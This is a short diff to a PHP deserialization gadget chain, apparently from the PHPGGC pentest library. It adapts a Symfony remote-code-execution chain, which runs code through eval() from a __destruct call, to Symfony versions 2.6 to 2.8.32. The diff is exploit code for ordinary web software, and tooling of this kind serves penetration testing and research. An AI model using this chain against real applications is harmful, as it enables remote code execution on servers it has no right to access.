@@ -2,9 +2,9 @@
 
 namespace GadgetChain\Symfony;
 
-class RCE2 extends \PHPGGC\GadgetChain\RCE
+class RCE3 extends \PHPGGC\GadgetChain\RCE
 {
-    public $version = '2.3.42 < 2.5';
+    public $version = '2.6 <= 2.8.32';
     public $vector = '__destruct';
     public $author = 'crlf';
     public $informations = 'Executes through eval() ( <?php \'.$code.\';die(); ?> )';
@@ -13,7 +13,7 @@ class RCE2 extends \PHPGGC\GadgetChain\RCE
     {
         $code = $parameters['code'];
 
-        return new \Symfony\Component\Process\ProcessPipes(
+        return new \Symfony\Component\Process\Pipes\WindowsPipes(
                new \Symfony\Component\Finder\Expression\Expression(
                new \Symfony\Component\Templating\PhpEngine(
                new \Symfony\Component\Templating\Storage\StringStorage(
